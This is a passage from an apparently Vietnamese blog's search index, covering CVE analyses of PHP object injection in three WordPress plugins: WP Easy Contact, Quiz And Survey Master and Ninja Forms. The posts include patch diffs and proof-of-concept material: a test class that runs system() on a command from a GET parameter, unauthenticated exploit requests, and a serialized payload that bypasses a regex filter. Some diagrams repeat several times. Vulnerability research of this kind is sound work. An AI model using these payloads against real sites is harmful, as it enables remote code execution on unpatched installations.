Analysis"],"collections":null,"content":"Analysis\rPlugin ƒëƒÉng k√Ω m·ªôt Ajax cho unauthenticated user (wp_ajax_nopriv): add_action('wp_ajax_nopriv_emd_get_widg_pagenum', 'emd_get_widg_pagenum'); Khi g·ª≠i request ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi action=emd_get_widg_pagenum, callback emd_get_widg_pagenum s·∫Ω ƒë∆∞·ª£c th·ª±c thi: function emd_get_widg_pagenum(){ $response = false; $pageno = isset($_GET['pageno']) ? (int) $_GET['pageno'] : 1; $div_id = isset($_GET['div_id']) ? sanitize_text_field($_GET['div_id']) : ''; $myapp = isset($_GET['app']) ? sanitize_text_field($_GET['app']) : ''; if(!empty($div_id)){ $pids = Array(); $front_ents = emd_find_limitby('frontend', $myapp); $widg_arr = explode(\"-\",$div_id); $mywidg = new $widg_arr[1](); ... } } ƒê·ªÉ ƒëo·∫°n new $widg_arr[1]() ƒë∆∞·ª£c g·ªçi, c·∫ßn v∆∞·ª£t qua ƒëi·ªÅu ki·ªán if(!empty($div_id)), t·ª©c ph·∫£i truy·ªÅn gi√° tr·ªã cho tham s·ªë div_id trong GET request. $widg_arr[1] l√† ph·∫ßn t·ª≠ ƒë∆∞·ª£c l·∫•y t·ª´ m·∫£ng sau khi explode gi√° tr·ªã $_GET['div_id']. V√≠ d·ª•, n·∫øu div_id=abc-Class th√¨ $widg_arr[1] s·∫Ω l√† Class, cho ph√©p kh·ªüi t·∫°o ƒë·ªëi t∆∞·ª£ng t√πy √Ω th√¥ng qua new $widg_arr[1](). ","date":"2025-11-18","objectID":"/vi/posts/2025-11-18-cve-2025-53572/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-18-cve-2025-53572/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Client sends GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum\u0026div_id=abc-Class\"] --\u003e B[\"WordPress hook: wp_ajax_nopriv_emd_get_widg_pagenum\"]\rB --\u003e C[\"Callback: emd_get_widg_pagenum()\"]\rC --\u003e D{\"Check if div_id is not empty\"}\rD -- True --\u003e E[\"explode('-', div_id) ‚Üí $widg_arr\"]\rE --\u003e F[\"Instantiate object: new $widg_arr[1]()\"]\rgraph TD\rA[\"Client sends GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum\u0026div_id=abc-Class\"] --\u003e B[\"WordPress hook: wp_ajax_nopriv_emd_get_widg_pagenum\"]\rB --\u003e C[\"Callback: emd_get_widg_pagenum()\"]\rC --\u003e D{\"Check if div_id is not empty\"}\rD -- True --\u003e E[\"explode('-', div_id) ‚Üí $widg_arr\"]\rE --\u003e F[\"Instantiate object: new $widg_arr[1]()\"]\rgraph TD\rA[\"Client sends GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum\u0026div_id=abc-Class\"] --\u003e B[\"WordPress hook: wp_ajax_nopriv_emd_get_widg_pagenum\"]\rB --\u003e C[\"Callback: emd_get_widg_pagenum()\"]\rC --\u003e D{\"Check if div_id is not empty\"}\rD -- True --\u003e E[\"explode('-', div_id) ‚Üí $widg_arr\"]\rE --\u003e F[\"Instantiate object: new $widg_arr[1]()\"]\rgraph TD\rA[\"Client sends GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum\u0026div_id=abc-Class\"] --\u003e B[\"WordPress hook: wp_ajax_nopriv_emd_get_widg_pagenum\"]\rB --\u003e C[\"Callback: emd_get_widg_pagenum()\"]\rC --\u003e D{\"Check if div_id is not empty\"}\rD -- True --\u003e E[\"explode('-', div_id) ‚Üí $widg_arr\"]\rE --\u003e F[\"Instantiate object: new $widg_arr[1]()\"]\r","date":"2025-11-18","objectID":"/vi/posts/2025-11-18-cve-2025-53572/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-18-cve-2025-53572/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rT·∫°o class ƒë·ªÉ test ƒë·∫∑t trong wp-config.php class ObjectInjection { public $command; public function __construct(){ $this-\u003ecommand = $_GET['cmd']; } function __destruct(){ die(system($this-\u003ecommand)); } } G·ª≠i l·∫°i request v·ªõi payload GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum\u0026div_id=abc-ObjectInjection\u0026cmd=ls+/ HTTP/1.1 K·∫øt qu·∫£\r","date":"2025-11-18","objectID":"/vi/posts/2025-11-18-cve-2025-53572/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-18-cve-2025-53572/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng trong WP Easy Contact \u003c= 4.0.1 xu·∫•t ph√°t t·ª´ vi·ªác x·ª≠ l√Ω input kh√¥ng an to√†n, cho ph√©p kh·ªüi t·∫°o ƒë·ªëi t∆∞·ª£ng tr·ª±c ti·∫øp t·ª´ d·ªØ li·ªáu ng∆∞·ªùi d√πng. B·∫±ng c√°ch l·ª£i d·ª•ng tham s·ªë div_id, attacker c√≥ th·ªÉ th·ª±c hi·ªán PHP Object Injection v√† d·∫´n ƒë·∫øn th·ª±c thi m√£ t√πy √Ω. B·∫£n v√° ·ªü 4.0.2 ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch b·ªï sung c∆° ch·∫ø whitelist v√† sanitize input, ch·ªâ cho ph√©p kh·ªüi t·∫°o c√°c class h·ª£p l·ªá. ƒê√¢y l√† minh ch·ª©ng r√µ r√†ng cho vi·ªác deserialization kh√¥ng an to√†n c√≥ th·ªÉ tr·ªü th√†nh ƒëi·ªÉm khai th√°c nghi√™m tr·ªçng khi k·∫øt h·ª£p v·ªõi quy·ªÅn truy c·∫≠p kh√¥ng x√°c th·ª±c. ","date":"2025-11-18","objectID":"/vi/posts/2025-11-18-cve-2025-53572/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-18-cve-2025-53572/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rB·ªÅ m·∫∑t t·∫•n c√¥ng kh√¥ng x√°c th·ª±c: L·ªó h·ªïng ƒë∆∞·ª£c k√≠ch ho·∫°t qua wp_ajax_nopriv, kh√¥ng c·∫ßn ƒëƒÉng nh·∫≠p. Nguy√™n nh√¢n g·ªëc r·ªÖ: S·ª≠ d·ª•ng tr·ª±c ti·∫øp input ng∆∞·ªùi d√πng (new $widg_arr[1]()), kh√¥ng c√≥ ki·ªÉm tra. Chi·∫øn l∆∞·ª£c v√° l·ªói: √Åp d·ª•ng whitelist v√† sanitize ƒë·ªÉ gi·ªõi h·∫°n class h·ª£p l·ªá. Best practice: Lu√¥n ki·ªÉm tra v√† l√†m s·∫°ch d·ªØ li·ªáu ƒë·∫ßu v√†o, tr√°nh deserialization kh√¥ng an to√†n, h·∫°n ch·∫ø kh·ªüi t·∫°o ƒë·ªëi t∆∞·ª£ng t·ª´ ngu·ªìn kh√¥ng tin c·∫≠y. ","date":"2025-11-18","objectID":"/vi/posts/2025-11-18-cve-2025-53572/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-18-cve-2025-53572/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rDeserialization WordPress WP Easy Contact Plugin \u003c= 4.0.1 is vulnerable to a high priority PHP Object Injection ","date":"2025-11-18","objectID":"/vi/posts/2025-11-18-cve-2025-53572/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-18-cve-2025-53572/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Quiz And Survey Master Plugin.","date":"2025-11-17","objectID":"/vi/posts/2025-11-17-cve-2025-49401/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/vi/posts/2025-11-17-cve-2025-49401/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin n√†y th·ª±c hi·ªán thao t√°c unserialize d·ªØ li·ªáu m√† ng∆∞·ªùi d√πng g·ª≠i qua tr∆∞·ªùng form, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p ng∆∞·ªùi d√πng ch∆∞a x√°c th·ª±c th·ª±c hi·ªán PHP Object Injection n·∫øu t·ªìn t·∫°i m·ªôt gadget ph√π h·ª£p trong h·ªá th·ªëng. CVE ID: CVE-2025-49401 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 10.2.5 Patched Versions: 10.2.6 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Quiz And Survey Master Plugin ","date":"2025-11-17","objectID":"/vi/posts/2025-11-17-cve-2025-49401/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/vi/posts/2025-11-17-cve-2025-49401/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Quiz And Survey Master: 10.2.5 ‚Äì vulnerable 10.2.6 ‚Äì patched Diff Tool (diff) ‚Üí Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o. ","date":"2025-11-17","objectID":"/vi/posts/2025-11-17-cve-2025-49401/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/vi/posts/2025-11-17-cve-2025-49401/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rL·ªó h·ªïng xu·∫•t ph√°t t·ª´ vi·ªác s·ª≠ d·ª•ng maybe_unserialize(). D√π ƒë√£ c√≥ bi·ªán ph√°p ki·ªÉm tra, c∆° ch·∫ø n√†y v·∫´n ch∆∞a ƒë·∫£m b·∫£o an to√†n tuy·ªát ƒë·ªëi. if ( preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids ) ) { return ''; } if ( is_serialized( $qmn_sanitize_random_ids ) ) { $unserialized = maybe_unserialize( $qmn_sanitize_random_ids ); if ( ! is_object( $unserialized ) \u0026\u0026 ! is_resource( $unserialized ) ) { return $unserialized; } } B·∫£n v√° ƒë√£ s·ª≠ d·ª•ng unserialize() thay v√¨ maybe_unserialize(). Ch·∫∑n to√†n b·ªô vi·ªác t·∫°o object khi unserialize b·∫±ng ['allowed_classes' =\u003e false] =\u003e NgƒÉn ch·∫∑n PHP Object Injection S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°\r","date":"2025-11-17","objectID":"/vi/posts/2025-11-17-cve-2025-49401/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/vi/posts/2025-11-17-cve-2025-49401/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rSau khi xem qua logic c·ªßa h√†m qsm_questions_answers_shortcode_to_text(), t√¥i nh·∫≠n th·∫•y c√°c t·ª´ kh√≥a nh∆∞ question v√† answer xu·∫•t hi·ªán kh√° nhi·ªÅu, cho th·∫•y h√†m n√†y nhi·ªÅu kh·∫£ nƒÉng li√™n quan tr·ª±c ti·∫øp ƒë·∫øn ch·ª©c nƒÉng x·ª≠ l√Ω c√¢u h·ªèi v√† c√¢u tr·∫£ l·ªùi. Thay v√¨ l·∫ßn theo t·ª´ng b∆∞·ªõc trace, t√¥i s·∫Ω ch·ªß ƒë·ªông t√¨m c√°c ch·ª©c nƒÉng c√≥ li√™n quan ƒë·∫øn question v√† answer ƒë·ªÉ s·ª≠ d·ª•ng, ƒë·ªìng th·ªùi k·∫øt h·ª£p debug t·∫°i h√†m qsm_questions_answers_shortcode_to_text(). N·∫øu c√°ch n√†y kh√¥ng hi·ªáu qu·∫£ th√¨ ta s·∫Ω ti·∫øp t·ª•c trace chi ti·∫øt. Sau m·ªôt h·ªìi t·ªçc v·∫°ch, t√¥i ƒë√£ t·∫°o post v·ªõi question t√πy √Ω T·∫°o quiz v·ªõi Block c·ªßa plugin\rTruy c·∫≠p post v√† submit answer Debugger ·ªü h√†m qsm_questions_answers_shortcode_to_text\rDebugger ƒë√£ nh·∫£y ƒë·∫øn h√†m qsm_questions_answers_shortcode_to_text() Request hi·ªán t·∫°i: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0 Accept: */* Accept-Language: en-US,en;q=0.7,vi;q=0.3 Accept-Encoding: gzip, deflate, br X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=----geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Length: 2373 Origin: http://localhost Connection: keep-alive Referer: http://localhost/index.php/2025/11/17/quiz-1/ Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin X-PwnFox-Color: blue Priority: u=0 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"qsm_hidden_questions\" ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"qsm_nonce\" b667038586 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"qsm_unique_key\" 691b485dd00e5 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"question1\" 0 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"answer_limit_keys_1\" ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"qmn_question_list\" 1Q ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"qmn_all_questions_count\" 1 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"total_questions\" 1 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"timer\" 3 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"timer_ms\" 0 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"qmn_quiz_id\" 1 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"complete_quiz\" confirmation ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"current_page\" 0 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"quiz_start_date\" 06:50:55 AM 11/17/2025 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"action\" qmn_process_quiz ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"nonce\" b667038586 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"qsm_unique_key\" 691b485dd00e5 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"currentuserTime\" 1763395682 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"currentuserTimeZone\" Asia/Bangkok ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4-- H√†m qmn_sanitize_random_ids_data() s·∫Ω g·ªçi ƒë·∫øn maybe_unserialize(). Nh∆∞ng tr∆∞·ªõc h·∫øt ph·∫£i ƒë√°p ·ª©ng ƒëi·ªÅu ki·ªán: if ( ! empty( $_POST['quiz_answer_random_ids'] ) ) Ta c√≥ th·ªÉ t·∫≠n d·ª•ng 1 tr∆∞·ªùng trong HTTP request ·ªü tr√™n ƒë·ªÉ th√™m thay ƒë·ªïi th√†nh quiz_answer_random_ids - Content-Disposition: form-data; name=\"currentuserTimeZone\" - Asia/Bangkok + Content-Disposition: form-data; ","date":"2025-11-17","objectID":"/vi/posts/2025-11-17-cve-2025-49401/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/vi/posts/2025-11-17-cve-2025-49401/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=qmn_process_quiz\u0026other_post_data --\u003e B[\"wp_ajax_nopriv_qmn_process_quiz\"]\rB --\u003e C[\"ajax_submit_results()\"]\rC --\u003e D[\"submit_results()\"]\rD --\u003e E[\"display_results_text()\"]\rE --\u003e F[\"generate_pages()\"]\rF -- apply filter mlw_qmn_template_variable_results_page --\u003e G[\"mlw_qmn_variable_question_answers()\"]\rG --\u003e H[\"qsm_questions_answers_shortcode_to_text()\"]\rH --\u003e K{\" ! empty( $_POST['quiz_answer_random_ids'] )\"}\rK -- true --\u003e L[\"qmn_sanitize_random_ids_data()\"] --\u003e M{\"preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids )\"}\rM -- true --\u003e N[\"return ''\"]\rM -- false --\u003e V[\"maybe_unserialize\"] --\u003e W[\"RCE\"]\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=qmn_process_quiz\u0026other_post_data --\u003e B[\"wp_ajax_nopriv_qmn_process_quiz\"]\rB --\u003e C[\"ajax_submit_results()\"]\rC --\u003e D[\"submit_results()\"]\rD --\u003e E[\"display_results_text()\"]\rE --\u003e F[\"generate_pages()\"]\rF -- apply filter mlw_qmn_template_variable_results_page --\u003e G[\"mlw_qmn_variable_question_answers()\"]\rG --\u003e H[\"qsm_questions_answers_shortcode_to_text()\"]\rH --\u003e K{\" ! empty( $_POST['quiz_answer_random_ids'] )\"}\rK -- true --\u003e L[\"qmn_sanitize_random_ids_data()\"] --\u003e M{\"preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids )\"}\rM -- true --\u003e N[\"return ''\"]\rM -- false --\u003e V[\"maybe_unserialize\"] --\u003e W[\"RCE\"]\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=qmn_process_quiz\u0026other_post_data --\u003e B[\"wp_ajax_nopriv_qmn_process_quiz\"]\rB --\u003e C[\"ajax_submit_results()\"]\rC --\u003e D[\"submit_results()\"]\rD --\u003e E[\"display_results_text()\"]\rE --\u003e F[\"generate_pages()\"]\rF -- apply filter mlw_qmn_template_variable_results_page --\u003e G[\"mlw_qmn_variable_question_answers()\"]\rG --\u003e H[\"qsm_questions_answers_shortcode_to_text()\"]\rH --\u003e K{\" ! empty( $_POST['quiz_answer_random_ids'] )\"}\rK -- true --\u003e L[\"qmn_sanitize_random_ids_data()\"] --\u003e M{\"preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids )\"}\rM -- true --\u003e N[\"return ''\"]\rM -- false --\u003e V[\"maybe_unserialize\"] --\u003e W[\"RCE\"]\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=qmn_process_quiz\u0026other_post_data --\u003e B[\"wp_ajax_nopriv_qmn_process_quiz\"]\rB --\u003e C[\"ajax_submit_results()\"]\rC --\u003e D[\"submit_results()\"]\rD --\u003e E[\"display_results_text()\"]\rE --\u003e F[\"generate_pages()\"]\rF -- apply filter mlw_qmn_template_variable_results_page --\u003e G[\"mlw_qmn_variable_question_answers()\"]\rG --\u003e H[\"qsm_questions_answers_shortcode_to_text()\"]\rH --\u003e K{\" ! empty( $_POST['quiz_answer_random_ids'] )\"}\rK -- true --\u003e L[\"qmn_sanitize_random_ids_data()\"] --\u003e M{\"preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids )\"}\rM -- true --\u003e N[\"return ''\"]\rM -- false --\u003e V[\"maybe_unserialize\"] --\u003e W[\"RCE\"]\r","date":"2025-11-17","objectID":"/vi/posts/2025-11-17-cve-2025-49401/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/vi/posts/2025-11-17-cve-2025-49401/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rS·ª≠ d·ª•ng plugin ƒë·ªÉ t·∫°o post ch·ª© quiz b·∫±ng vi·ªác s·ª≠ d·ª•ng QSM block Submit form v√† cho request ƒëi qua Burp proxy S·ª≠a l·∫°i value c·ªßa quiz_answer_random_ids ch·ª©a chu·ªïi serialized a:1:{i:0;O:15:\"ObjectInjection\":1:{s:7:\"command\";s:4:\"ls /\";}} G·ª≠i l·∫°i request M·∫πo ƒê·ªÉ test tr√™n local, ta t·∫°o class ch·ª©a magic method __wakeup() s·∫Ω t·ª± k√≠ch ho·∫°t khi deserialized ƒë·∫∑t n√≥ trong wp-config.php class ObjectInjection { public $command; function __destruct(){ die(system($this-\u003ecommand)); } } ","date":"2025-11-17","objectID":"/vi/posts/2025-11-17-cve-2025-49401/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/vi/posts/2025-11-17-cve-2025-49401/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-49401 xu·∫•t ph√°t t·ª´ vi·ªác x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o thi·∫øu an to√†n v·ªõi maybe_unserialize(), cho ph√©p k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c cung c·∫•p payload serialized ƒë·ªÉ th·ª±c thi PHP Object Injection. C∆° ch·∫ø l·ªçc y·∫øu d·ª±a tr√™n preg_match ch·ªâ ch·∫∑n payload b·∫Øt ƒë·∫ßu b·∫±ng O: ho·∫∑c C:, nh∆∞ng ho√†n to√†n th·∫•t b·∫°i tr∆∞·ªõc serialized array ch·ª©a object. K·∫øt h·ª£p v·ªõi endpoint AJAX m·ªü (wp_ajax_nopriv_qmn_process_quiz), lu·ªìng th·ª±c thi d·∫´n payload ƒëi qua nhi·ªÅu l·ªõp x·ª≠ l√Ω tr∆∞·ªõc khi b·ªã unserialize, cu·ªëi c√πng g√¢y ra th·ª±c thi m√£ t√πy √Ω (RCE) n·∫øu t·ªìn t·∫°i gadget ph√π h·ª£p. B·∫£n v√° s·ª≠ d·ª•ng unserialize(..., ['allowed_classes' =\u003e false]) ƒë√£ lo·∫°i b·ªè ho√†n to√†n kh·∫£ nƒÉng t·∫°o object, t·ª´ ƒë√≥ x·ª≠ l√Ω tri·ªát ƒë·ªÉ l·ªó h·ªïng. ","date":"2025-11-17","objectID":"/vi/posts/2025-11-17-cve-2025-49401/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/vi/posts/2025-11-17-cve-2025-49401/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rmaybe_unserialize() lu√¥n nguy hi·ªÉm khi x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫øn t·ª´ ng∆∞·ªùi d√πng, ƒë·∫∑c bi·ªát trong m√¥i tr∆∞·ªùng WordPress. Regex th·ªß c√¥ng kh√¥ng ƒë·ªß an to√†n ƒë·ªÉ ngƒÉn khai th√°c deserialization ‚Äî attacker c√≥ th·ªÉ ƒë√≥ng g√≥i payload trong array ƒë·ªÉ bypass. AJAX endpoint d√†nh cho unauthenticated user l√† b·ªÅ m·∫∑t t·∫•n c√¥ng c·ª±c k·ª≥ nh·∫°y c·∫£m v√† c·∫ßn ƒë∆∞·ª£c ki·ªÉm tra nghi√™m ng·∫∑t. allowed_classes = false l√† bi·ªán ph√°p ph√≤ng th·ªß hi·ªáu qu·∫£ nh·∫•t khi kh√¥ng c·∫ßn unserialize object. T√≠nh nƒÉng plugin c√†ng ph·ª©c t·∫°p, nguy c∆° xu·∫•t hi·ªán gadget chain d·∫´n ƒë·∫øn RCE c√†ng cao. ","date":"2025-11-17","objectID":"/vi/posts/2025-11-17-cve-2025-49401/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/vi/posts/2025-11-17-cve-2025-49401/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rDeserialization WordPress Quiz And Survey Master Plugin \u003c= 10.2.5 is vulnerable to a high priority PHP Object Injection ","date":"2025-11-17","objectID":"/vi/posts/2025-11-17-cve-2025-49401/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/vi/posts/2025-11-17-cve-2025-49401/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Ninja Forms Plugin.","date":"2025-11-14","objectID":"/vi/posts/2025-11-14-cve-2025-9083/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/vi/posts/2025-11-14-cve-2025-9083/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin n√†y th·ª±c hi·ªán thao t√°c unserialize d·ªØ li·ªáu m√† ng∆∞·ªùi d√πng g·ª≠i qua tr∆∞·ªùng form, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p ng∆∞·ªùi d√πng ch∆∞a x√°c th·ª±c th·ª±c hi·ªán PHP Object Injection n·∫øu t·ªìn t·∫°i m·ªôt gadget ph√π h·ª£p trong h·ªá th·ªëng. CVE ID: CVE-2025-9083 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 3.11.0 Patched Versions: 3.11.1 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Ninja Forms Plugin ","date":"2025-11-14","objectID":"/vi/posts/2025-11-14-cve-2025-9083/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/vi/posts/2025-11-14-cve-2025-9083/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Ninja Forms: 3.11.0 ‚Äì vulnerable 3.11.1 ‚Äì patched Diff Tool (diff) ‚Üí Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o. ","date":"2025-11-14","objectID":"/vi/posts/2025-11-14-cve-2025-9083/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/vi/posts/2025-11-14-cve-2025-9083/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rL·ªó h·ªïng xu·∫•t ph√°t t·ª´ h√†m extractSubmissions() thu·ªôc file FieldsetRepeater.php if(is_string($fieldSubmissionValue)){ $fieldSubmissionValue = maybe_unserialize($fieldSubmissionValue); } maybe_unserialize() ƒë∆∞·ª£c g·ªçi nh∆∞ng kh√¥ng c√≥ c∆° ch·∫ø ch·ªëng l·∫°i t·∫•n c√¥ng PHP Object Injection B·∫£n l·ªói v√† b·∫£n v√°\rB·∫£n v√° ƒë√£ s·ª≠ d·ª•ng unserialize() thay v√¨ maybe_unserialize(). Ch·∫∑n to√†n b·ªô vi·ªác t·∫°o object khi unserialize b·∫±ng ['allowed_classes' =\u003e false] =\u003e NgƒÉn ch·∫∑n PHP Object Injection ","date":"2025-11-14","objectID":"/vi/posts/2025-11-14-cve-2025-9083/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/vi/posts/2025-11-14-cve-2025-9083/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rT√™n c·ªßa class\rT√™n class t∆∞∆°ng ·ª©ng v·ªõi m·ªôt layout fields trong khi t·∫°o blank form b·∫±ng plugin T·∫°o form v·ªõi Repeatable Fieldset\rTh·ª≠ t·∫°o form v·ªõi Repeatable Fieldset sau ƒë√≥ k√©o Single Line Text v√†o Repeatable Fieldset ƒë·ªÉ l√†m input, embed n√≥ v√†o post ho·∫∑c page Th√™m form v√†o post\rPublic post v√† th·ª≠ submit form v·ªõi input l√† payload: Request th·ª≠ v·ªõi `payload`\rTa th·∫•y to√†n b·ªô d·ªØ li·ªáu ƒë∆∞·ª£c g√°n v√†o param formData, ta copy n·ªôi dung ƒë√£ ƒë∆∞·ª£c URL Decode v√†o ·ª©ng d·ª•ng format JSON online https://jsonformatter.org/ Data d·∫°ng JSON ƒë∆∞·ª£c format\rQuan s√°t debugger ta th·∫•y s·ª± t∆∞∆°ng ƒë·ªìng ·ªü ƒë√¢y D·ªØ li·ªáu trong debugger\r$fieldSubmissionValue t∆∞∆°ng ·ª©ng v·ªõi value trong field c√≥ id 8. Nh∆∞ v·∫≠y khi value l√† chu·ªói th√¨ n√≥ s·∫Ω g·ªçi h√†m maybe_unserialize() Ta t·∫°o class v√† ƒë·∫∑t trong wp-config.php ƒë·ªÉ test s·ª± ki·ªán k√≠ch ho·∫°t khi maybe_unserialize() ƒë∆∞·ª£c g·ªçi. class ObjectInjection { public $command; function __destruct(){ die(system($this-\u003ecommand)); } } G·ª≠i l·∫°i request submit v·ªõi gi√° tr·ªã c·ªßa value l√† chu·ªói serialize ch·ª©a payload. V√¨ bao b·ªçc b√™n ngo√†i l√† JSON n√™n khi truy·ªÅn chu·ªói c·∫ßn ph·∫£i ch√∫ √Ω escape \" th√†nh \\\" ƒë·ªÉ tr√°nh g√¢y l·ªói. Change gi√° tr·ªã c·ªßa value th√†nh chu·ªói serialize\rGi√° tr·ªã c·ªßa value trong debugger\rShell th·ª±c thi =\u003e Deserialize ƒë∆∞·ª£c k√≠ch ho·∫°t. Deserialize ƒë∆∞·ª£c k√≠ch ho·∫°t\rLu·ªìng g·ªçi h√†m c·ªßa callstack: ·ª®ng d·ª•ng 